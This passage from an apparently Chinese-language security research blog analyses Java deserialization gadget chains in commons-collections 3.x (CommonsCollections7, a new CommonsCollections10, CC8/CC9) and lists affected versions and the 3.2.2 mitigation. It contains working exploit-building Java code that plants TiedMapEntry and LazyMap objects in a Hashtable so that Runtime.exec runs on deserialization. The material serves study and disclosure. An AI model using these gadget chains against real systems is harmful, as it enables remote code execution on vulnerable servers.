    }catch(Exception e){
      keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
    }
    Permit.setAccessible(keyField);// 设置该Field可被访问修改
    keyField.set(node, entry);// 对node实例填充key的值为TiedMapEntry实例
经过上面的操作，最终的HashSet实例被我们嵌入了构造好的TiedMapEntry实例。
这里在调试的过程中，发现用ysoserail的Reflections来简化exp，出来的结果有点不一样，还没有找到具体的原因。如果有师傅遇到过这种问题，欢迎一起讨论讨论！
**CommonsCollections7**
CommonsCollections利用的是key的hash冲突的方法来触发`equals`函数，该函数会调用`LazyMap.get`函数
那么构造exp的关键就是构造一个hash冲突的LazyMap了。
这里大家可以跟一下String.hashCode函数，他的计算方法存在不同字符串相同hash的可能性，例如如下代码
CommonsCollections7用的就是这个bug来制造hash冲突。
这里需要提一点的是触发LazyMap.get函数
要走到第151行红框框上，首先需要满足的是`map`里不存在当前这个`key`
但是明显在第一次不存在这个`key`后，会更新`map`的键值，这将导致下次同样的`key`进来，就不会触发后续的payload了。我们在写exp的时候需要注意到这一点。
来看一下ysoserial的CommonsCollections7是怎么编写的！
    Map innerMap1 = new HashMap();
    Map innerMap2 = new HashMap();
    // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
    lazyMap1.put("yy", 1);
    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
    lazyMap2.put("zZ", 1);
    // Use the colliding Maps as keys in Hashtable
    Hashtable hashtable = new Hashtable();
    hashtable.put(lazyMap1, 1);
    hashtable.put(lazyMap2, 2);
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
    // Needed to ensure hash collision after previous manipulations
    lazyMap2.remove("yy");
其中第两次的put会使得会使得LazyMap2中增加了yy这个键值，为了保证反序列化后仍然可以触发后续的利用链，这里需要将lazyMap2的yy键值remove掉。
###  6\. 构造新CommonsCollections10
经过对前面1,3,5,6,7的分析，我们其实可以发现很多payload都是“杂交”的成果。那么我们是否能根据前面的分析，构造出一个新的CommonsCollections的payload呢？答案当然是肯定的，接下来讲一下我找到的一个新payload利用。
这个payload为CommonsCollections6和7的结合，同CommonsCollections6类似，这里也用到了`TiedMapEntry`的`hashCode`函数
我们在分析`Hashtable`的`reconstitutionPut`函数时，看下图
该函数在第1234行对`key`调用了一次`hashCode`函数，那么很明显，如果key值被代替为构造好的`TiedMapEntry`实例，这里我们就能触发`LazyMap.get`函数，后续的调用链就类似了。
整理一下利用链
    Hashtable.readObject()
        -> Hashtable.reconstitutionPut
        -> key.hashCode() => TiedMapEntry.hashCode()
        -> TiedMapEntry.getValue
        -> TiedMapEntry.map.get() => LazyMap.get()
        -> factory.transform() => ChainedTransformer.transform()
        -> 前文构造的Runtime.getRuntime().exec()
其实从利用链来看，与CommonsCollections6的区别在于前部的触发使用了不同的对象。
接下来，结合第5点的学习，我们来写一下这个payload的利用链exp
    final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
    final Map innerMap = new HashMap();
    final Map innerMap2 = new HashMap();
    final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
    TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
    Hashtable hashtable = new Hashtable();
    hashtable.put("foo",1);
    // 获取hashtable的table类属性
    Field tableField = Hashtable.class.getDeclaredField("table");
    Permit.setAccessible(tableField);
    Object[] table = (Object[])tableField.get(hashtable);
    Object entry1 = table[0];
    if(entry1==null)
        entry1 = table[1];
    // 获取Hashtable.Entry的key属性
    Field keyField = entry1.getClass().getDeclaredField("key");
    Permit.setAccessible(keyField);
    // 将key属性给替换成构造好的TiedMapEntry实例
    keyField.set(entry1, entry);
    // 填充真正的命令执行代码
    Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
    return hashtable;
###  7\. 梅子酒师傅的CommonsCollections9
找到上面CommonsCollections10时，在网上找了一下有没有师傅已经挖到过了，一共找到下面几位师傅
  * 
  * 
  * 
一个一个来说
  1. 第一个[Jayl1n](https://github.com/Jayl1n)师傅做的改变主要是最终的Runtime.getRuntime().exec改成了URLClassLoader.loadClass().newInstance的方式，前面用的还是CommonsCollections6，这里暂时不将其归类为新的利用链。
  2. 第二个是 **[梅子酒](https://github.com/meizjm3i)** 师傅提交的CommonsCollections9，主要利用的是CommonsCollections:3.2版本新增的`DefaultedMap`来代替`LazyMap`，因为这两个Map有同样的get函数可以被利用，这里不再具体分析。
  3. 第三个是 **[navalorenzo](https://github.com/navalorenzo)** 师傅提交的CommonsCollections8，其利用链基于CommonsCollections:4.0版本，暂时不在本篇文章的分析范围内，后面会好好分析一下。
## 0x03 总结
联合前面两篇文章[CommonsCollections1](http://blog.0kami.cn/2019/10/24/study-java-deserialized-vulnerability/)、[CommonsCollections3](http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3/)，在加上本文的CommonsCollections5，6，7，9，10。
由于网上已经有类似的文章做了[总结](https://www.freebuf.com/articles/web/214096.html)，这里就简单做一下`CommonsCollections CommonsCollection1、3
  2. jdk7 & jdk8 => CommonsCollections5,6,7,9,10
各exp的commons-collections适用版本
  1. commons-collections<=3.1 CommonsCollections1,3,5,6,7,10
  2. commons-collections<=3.2.1 CommonsCollections1,3,5,6,7,9,10
最后的最后，commons-collections:3.x版本的反序列化利用链就分析到这里，其实我相信如果想继续挖可代替的利用链还是会有的，就像本文挖到的CommonsCollections10，如果各位师傅有兴趣可以继续挖下去，也欢迎和各位师傅一起交流。
后续还会把commons-collections:4版本的利用链做一个分析，欢迎一起交流：）
**commons-collections:3.2.2及以上版本的改变**
前面的分析并没有提到3.2.2版本发生了啥事，导致了利用链的失效，这里简单提一下
3.2.2版本对InvokerTransformer增加了readObject函数，并且做了是否允许反序列化的检查，在`FunctorUtils.checkUnsafeSerialization`函数内。
这里UNSAFE_SERIALIZABLE_PROPERTY的值默认为false，如果需要为true，需要在运行时指定。
所以在使用InvokerTransformer作为反序列化利用链的一部分时，会throw一个exception。除了InvokerTransformer类外，还有CloneTransformer,
ForClosure, InstantiateFactory, InstantiateTransformer, InvokerTransformer,  
PrototypeCloneFactory, PrototypeSerializationFactory,
WhileClosure。所以在3.2.2版本以上，基本上利用链都已经废了。
当然，这种方法治标不治本，如果可以在这些类以外，构造一个利用链同样可以达到前面的效果。